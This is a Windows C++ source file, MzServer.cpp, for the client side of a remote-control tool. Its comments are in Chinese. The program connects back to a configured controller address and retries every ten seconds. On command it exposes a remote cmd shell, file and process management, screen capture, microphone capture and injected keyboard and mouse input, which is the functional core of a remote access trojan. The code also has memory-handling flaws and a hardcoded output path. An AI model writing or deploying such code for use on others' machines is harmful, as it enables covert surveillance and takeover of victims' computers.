// MzServer.cpp : Defines the entry point for the application.
//
//本cpp  一模一样 确认#include <afxwin.h>
#include <afxwin.h> 
#include "stdafx.h"
#include "MzServer.h"

#include "FileOperator.h"
#include <cstdio>
#include "ScreenManage.h"
#include "Process.h"
#include "CmdManage.h"
#include "ConnectInfo.h"
#include "WindowManager.h"
#include "Voice.h"
#include <shellapi.h>
#include "resource3.h"

#include "./zlib.h"
#pragma comment(lib,"./zlib.lib")	//图象无损数据压缩使用zlib库函数



//套接字的初始化
DWORD __stdcall ConnectThread(LPVOID lparam)
{
	char Buffer[1024 * 100];
	SOCKET MainSocket=socket(AF_INET,SOCK_STREAM,0);
	struct sockaddr_in LocalAddr;
	LocalAddr.sin_family=AF_INET;
	LocalAddr.sin_port=htons(ConnectInfo::getConnectInfo()->port);
	LocalAddr.sin_addr.S_un.S_addr=inet_addr(ConnectInfo::getConnectInfo()->ipAddress); 

	//连接主控端
	if(connect(MainSocket,(PSOCKADDR)&LocalAddr,sizeof(LocalAddr)) == SOCKET_ERROR )
	{
		return 0;
	}
	else
	{

	}
	SysInfo m_SysInfo;
	GetSystemInfo(m_SysInfo);

	MsgHead msgHead;
	msgHead.dwCmd=SOCKET_CONNECT;//自定义SOCKET_CONNECT为一个数值 用来标识传送系统消息的命令
	msgHead.dwSize=sizeof(SysInfo);//SysInfo是我们自定义的结构 储存着系统的信息

	if(!SendMsg(MainSocket,(char*)&m_SysInfo,&msgHead))//自定义函数传递命令 注意sendmsg我们定义参数2是一个字符串 所以将结构体转化为字符串传输
	{
		closesocket(MainSocket);
		return 1;
	}
	while(1)
	{
		memset(Buffer, 0, sizeof(Buffer));
		if (!RecvMsg(MainSocket, (char *)Buffer, &msgHead))
		{
			shutdown(MainSocket, 0x02);
			closesocket(MainSocket);//此时主控端那边将掉线
			break;
		}

		switch(msgHead.dwCmd)
		{
		case CMD_FILEMANAGE:  
			{
				CreateThread(NULL, NULL, FileManageThread, NULL, NULL, NULL);//创建线程处理文件管理
				break;
			}
		case CMD_WINDOW_MANAGER_DLG_SHOW:
			{
				CreateThread(NULL, NULL, WindowManagerThread, NULL, NULL, NULL);//创建线程处理文件管理
				break;
			}
		case CMD_SCREEN_REQUEST://收到了屏幕传输请求
			{
				DWORD *pDWORD = new DWORD;
				*pDWORD = MainSocket;
				CreateThread(NULL, NULL, ScreenManageThread, pDWORD, NULL, NULL);//创建线程处理屏幕传输
				break;
			}
		case CMD_CMD_SHELL_REQUEST://收到了cmd命令行传输请求
			{
				CreateThread(NULL, NULL, CmdManageThread, NULL, NULL, NULL);//创建线程处理CMD 命令 传输
				break;
			}
		case CMD_PROCESS_MANAGER_DLG_SHOW:
			{
				CreateThread(NULL, NULL, ProcessManagerThread, NULL, NULL, NULL);
				break;
			}
		case CMD_VOICE:
			{
				CreateThread(NULL, NULL, VoiceThread, NULL, NULL, NULL);;
				break;
			}
		case CMD_OPEN_URL:
			{
				ShellExecute(NULL, "open", Buffer, NULL, NULL, SW_SHOWNORMAL);
				break;
			}
		case CMD_MESSAGEBOX:
			{
				char *pChar = new char[1024 * 22];
				memcpy(pChar,(char*)&MainSocket, sizeof(MainSocket));
				memcpy(pChar + sizeof(MainSocket), Buffer, sizeof(MyMessageBox));
				CreateThread(NULL, NULL, MessageBoxThread,pChar, NULL, NULL);
				break;
			}
		case CMD_HEARTBEAT://心跳包
			{
				//不用处理这里 
			}
			break;
		case CMD_CTRLALTDEL:// Ctrl + Alt + del
			{

			}
			break;
		case CMD_KEYDOWN://WM_KEYDOWN 
			{
				//	XScreenXor OpenDesktop;
				//	::MessageBox(NULL, "key down", "DD", MB_OK);
				int nVirtKey = msgHead.dwExtend1;
				keybd_event((BYTE)nVirtKey,0,0,0);

			}
			break;
		case CMD_KEYUP://WM_KEYUP
			{
				//XScreenXor OpenDesktop;
				int nVirtKey = msgHead.dwExtend1;
				keybd_event((BYTE)nVirtKey,0,KEYEVENTF_KEYUP,0);
			}
			break;
		case CMD_MOUSEMOVE://WM_MOUSEMOVE
			{
				//XScreenXor OpenDesktop;
				//::MessageBox(NULL, "mouse move", "DD", MB_OK);
				POINT pt;
				pt.x = msgHead.dwExtend1;
				pt.y = msgHead.dwExtend2;
				SetCursorPos(pt.x, pt.y);

			}
			break;
		case CMD_LBUTTONDOWN://WM_LBUTTONDOWN
			{
				//XScreenXor OpenDesktop;
				//::MessageBox(NULL, "LBUTTONDOWN", "DD", MB_OK);
				mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
			}
			break;
		case CMD_LBUTTONUP://WM_LBUTTONUP
			{
				//XScreenXor OpenDesktop;
				mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
			}
			break;
		case CMD_LBUTTONDBLCLK://WM_LBUTTONDBLCLK
			{
				//XScreenXor OpenDesktop;
				mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
				mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
				mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
				mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
			}
			break;
		case CMD_RBUTTONDOWN://WM_RBUTTONDOWN  
			{
				//::MessageBox(NULL, "RBUTTONDOWN", "DD", MB_OK);
				//	XScreenXor OpenDesktop;
				mouse_event(MOUSEEVENTF_RIGHTDOWN,0,0,0,0);
			}
			break;
		case CMD_RBUTTONUP://WM_RBUTTONUP
			{
				//XScreenXor OpenDesktop;
				mouse_event(MOUSEEVENTF_RIGHTUP,0,0,0,0);
			}
			break;
		case CMD_RBUTTONDBLCLK://WM_RBUTTONDBLCLK
			{
				//XScreenXor OpenDesktop;
				mouse_event(MOUSEEVENTF_RIGHTDOWN,0,0,0,0);
				mouse_event(MOUSEEVENTF_RIGHTUP,0,0,0,0);
				mouse_event(MOUSEEVENTF_RIGHTDOWN,0,0,0,0);
				mouse_event(MOUSEEVENTF_RIGHTUP,0,0,0,0);
			}
			break;
		case CMD_SHOW_RECV_SCREEN_DLG :
			{
				IsFirst = TRUE;
				CreateThread(NULL, NULL, OpenDlg, NULL, NULL, NULL);//创建线程处理屏幕传输
				break;
			}
		case CMD_SCREEN_TO_SERVER:
				getScreenData(MainSocket);
			    pWnd->Invalidate(TRUE);
			break;
		default:
			{
				break;
			}

		}
	}

	return 1;
}



void getScreenData(SOCKET m_MainSocket){
	//以下为屏幕的获取， 一直获取并显示  直到接收不到  
	MsgHead MsgRecv; 
		if(!RecvData( m_MainSocket, (char *)&MsgRecv, sizeof(MsgHead)))
		{
			closesocket(m_MainSocket);
			m_MainSocket = INVALID_SOCKET;
			return ;
		}
		BITMAPFILEHEADER   bmfHdr; 
		bmfHdr.bfType = 0x4D42;  // "BM"  	// 设置位图文件头 
		bmfHdr.bfSize = MsgRecv.dwExtend1;
		bmfHdr.bfReserved1 = 0;
		bmfHdr.bfReserved2 = 0;
		bmfHdr.bfOffBits = MsgRecv.dwExtend2;
		m_InfoSize = MsgRecv.dwExtend2 - sizeof(BITMAPFILEHEADER);//m_InfoSize为info信息头和调色板的大小的和


		int lenthcompress = MsgRecv.dwSize;
		int lenthUncompress = MsgRecv.dwExtend1 - sizeof(BITMAPFILEHEADER);

		if(!RecvData( m_MainSocket,(char *)pCompress,lenthcompress))
		{
			closesocket( m_MainSocket);
		    m_MainSocket = INVALID_SOCKET;
			return ;			    
		}

		IsFirst = pCompress[0];//传递过来的第一个字节标记是否是第一帧

		DWORD sz = 2048 * 1536 * 3 * 2;  //这个sz还必须有值  不然会崩溃
		if( pChanged == NULL ||  pData == NULL)  // 窗口关闭时，本线程可能仍旧运行一小段时间 故如果pData为NULL 就退出线程 否则弹出错误框
		{
			return ;
		}
		if(pCompress == NULL) return ;
		uncompress( pChanged,
			&sz,//原始长度
			pCompress + 1,//+1 是因为传过来的第一个字节不是压缩的数据 而是是否是第一帧（改变像素位数后也算第一帧）
			lenthcompress);//压缩后长度
		 m_ChangedOff = 0;
		if( IsFirst)
		{
			memcpy( pData,  pChanged, sz);
		}
		else
		{
			m_ChangedOff =0;
			memcpy( pData,  pChanged,  m_InfoSize); //将新的信息头和调色板复制进data 
			BITMAPINFOHEADER bi;
			memcpy(&bi,  pData, sizeof(bi));//将文件信息头保存到bi

			m_ChangedOff =  m_InfoSize;
			RECT rect;
			memcpy(&rect,  pChanged +  m_ChangedOff, sizeof(rect));//得到变化的数据的范围 
			m_ChangedOff += sizeof(rect);

			int m_DataOff =  m_InfoSize;
			BYTE *Dst, *Src; 
			int BitSz;
			BitSz = (rect.right - rect.left + 1) * bi.biBitCount / 8;//每行需要更新的数据量
			int OneLineByte =  bi.biSizeImage / bi.biHeight;
			for(int i = rect.top; i <= rect.bottom ; i++) 
			{						
				Src =  pChanged +  m_ChangedOff;
				Dst =  pData +  m_InfoSize + i * OneLineByte + rect.left * bi.biBitCount / 8;
				memcpy(Dst, Src, BitSz);//保存每一行变化的数据
				m_ChangedOff += BitSz;
			}
		}

		//将bitmap数据写入文件中  创建一个bmp图像文件
		strcpy(strFilePath,"C://Proj//hehe.bmp");
		HANDLE hFile;
		
		hFile = CreateFile(strFilePath , GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);//创建位图文件   
		DWORD dwWritten;
		WriteFile(hFile, (LPSTR)&bmfHdr, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);	// 写入位图文件头
		WriteFile(hFile, (LPSTR)pData, bmfHdr.bfSize, &dwWritten, NULL);// 写入位图文件其余内容
		CloseHandle(hFile); 	

		//pWnd->Invalidate(TRUE);
		IsFirst = FALSE;
		Sleep(10);
	
}

/*

HWND hwndButton;
HWND hWnd;
HINSTANCE hInst;
TCHAR szWinName[]="MyWin";//窗口类名
TCHAR str[255]="";//保存输出的字符串
bool isExist;
CWnd *pWnd;
*/
DWORD __stdcall OpenDlg(LPVOID lparam){
	//CWnd* pWnd = new CWnd;	

	//pWnd->CreateEx(WS_EX_CLIENTEDGE, NULL, "教师端屏幕",
	//0, 0, 500, 500, NULL, NULL,NULL);

	//显示这个	//定义一个windows类
	if(isExist == true) return 0;
	//::MessageBox(NULL, "dd", "dd", MB_OK);

	WNDCLASSEX wcl;
	wcl.style=CS_HREDRAW|CS_VREDRAW;
	wcl.style&=~CS_VREDRAW;
	wcl.lpfnWndProc=WindowsFunc;
	wcl.cbClsExtra=0;
	wcl.cbWndExtra=0;
	wcl.hInstance=hInst;
	wcl.hIcon=LoadIcon(NULL,IDI_APPLICATION);
	wcl.hIconSm=LoadIcon(NULL,IDI_INFORMATION);
	wcl.hbrBackground=(HBRUSH)GetStockObject(WHITE_BRUSH);
	wcl.hCursor=LoadCursor(NULL,IDC_ARROW);
	wcl.lpszMenuName  = NULL;
	wcl.lpszClassName=szWinName;
	wcl.cbSize=sizeof(WNDCLASSEX);

	//注册这个窗体
	RegisterClassEx(&wcl);
		


	hWnd=CreateWindow(    szWinName,
		"SCREEN",
		WS_OVERLAPPEDWINDOW,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		HWND_DESKTOP,
		NULL,
		hInst,
		NULL);
	pWnd = CWnd::FromHandle(hWnd);
	ShowWindow(hWnd,SW_SHOWNORMAL);
	UpdateWindow(hWnd);	
	isExist = true;
	MSG msg = { 0 };
	//消息循环处理,获取消息
	
	while( GetMessage( &msg, NULL, 0, 0 ) )
	{
		
		//派发消息
		DispatchMessage( &msg );
	}
	return 0;

}


LRESULT CALLBACK WindowsFunc(HWND hWnd,UINT message,WPARAM wParam,LPARAM lParam)
{
	HDC hdc;
	switch (message)
	{
	case WM_CHAR://按键消息处理
		//hdc=GetDC(hWnd);//获得设备上下文
		//strcpy(str,"            ");
		//TextOut(hdc,1,1,str,strlen(str));//擦除原有字符
		//sprintf(str,"%c",(char)wParam);//把字符转换成字符串
		//TextOut(hdc,1,1,str,strlen(str));//输出字符
		//ReleaseDC(hWnd,hdc);//释放设备描述表
		break;
	case WM_LBUTTONDOWN:
		//hdc=GetDC(hWnd);//获得设备上下文
		//strcpy(str,"            ");
		//TextOut(hdc,1,1,str,strlen(str));//擦除原有字符
		//sprintf(str,"Mouse");//把字符转换成字符串
		//TextOut(hdc,1,1,str,strlen(str));//输出字符
		//ReleaseDC(hWnd,hdc);//释放设备描述表
		break;
	case WM_CREATE://这里创建一个按钮，这里没有用到ID_BUTTON绑定
		pData = new BYTE [2048 * 1536 * 3 * 2];//为分辨率2048 * 1536 且位为24位即3个字节的大小的 2倍  
		pChanged = new BYTE [2048 * 1536 * 3 * 2];//为分辨率2048 * 1536 且位为24位即3个字节的大小的 2倍  
		pCompress = new BYTE [2048 * 1536 * 3 * 2];
		m_ScreenBits = 8;	
		break; 
	case WM_COMMAND: //请问如何响应这个按钮？ID_BUTTON这个宏存在定义了，但创建的时候又如何绑定呢？
		/*switch(LOWORD(wParam))
		{
		case ID_BUTTON:
		MessageBox("hello");
		break; 
		}*/
		break;
	case WM_ERASEBKGND:

		//::MessageBox(NULL, "dd", "dd", MB_OK);
		break;
	case WM_DESTROY://终止应用程序
		isExist = false;
		if(pData != NULL) { delete pData; pData = NULL;}
		if(pChanged != NULL) { delete pChanged; pChanged = NULL;}
		if(pCompress != NULL) {delete pCompress;}
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hWnd,message,wParam,lParam);
	}
	return 0;
}



DWORD __stdcall FileManageThread(LPVOID lparam)//线程处理文件管理
{
	MainFileManage();
	return 0;
}

DWORD __stdcall WindowManagerThread(LPVOID lparam)//线程处理文件管理
{
	windowManager();
	return 0;
}

DWORD __stdcall ProcessManagerThread(LPVOID lparam)//线程处理文件管理
{
	processManager();
	return 0;
}

DWORD __stdcall MessageBoxThread(LPVOID lparam)//线程处理文件管理
{
	SOCKET MainSocket;
	memcpy(&MainSocket, (char*)lparam, sizeof(SOCKET));
	MyMessageBox myMessageBox;
	memcpy(&myMessageBox, (char*)lparam + sizeof(SOCKET), sizeof(MyMessageBox));

	if(myMessageBox.category == 2)
		::MessageBox(NULL, myMessageBox.content, myMessageBox.title, MB_OK|MB_ICONERROR);
	else
		::MessageBox(NULL, myMessageBox.content, myMessageBox.title, MB_YESNO);
	delete (char *)lparam;
	return 0;
}


DWORD __stdcall RuningThread(LPVOID lParam)
{
	WSADATA lpWSAData;
	WSAStartup(MAKEWORD(2,2),&lpWSAData);

	while(1)
	{
		HANDLE hThread=NULL;
		hThread = CreateThread(NULL,NULL,ConnectThread,NULL,NULL,NULL);
		WaitForSingleObject(hThread,INFINITE);//INFINTE无限长 即等待时间无限长 只有当hThread线程结束才继续向下运行
		CloseHandle(hThread);
		Sleep(10000);
	}

	WSACleanup();
	return 0;
}

int APIENTRY WinMain(HINSTANCE hInstance,
					 HINSTANCE hPrevInstance,
					 LPSTR     lpCmdLine,
					 int       nCmdShow)
{
	// TODO: Place code here.
	hInst=hInstance;// 暂存   用于创建窗口
	isExist = false; //接受屏幕数据的窗口是否已经存在
	HANDLE hThread=NULL;
	hThread=CreateThread(NULL,NULL,RuningThread,NULL,NULL,NULL);
	WaitForSingleObject(hThread,INFINITE);//INFINTE无限长 即等待时间无限长 只有当hThread线程结束才继续向下运行
	CloseHandle(hThread);

	return 0;
}



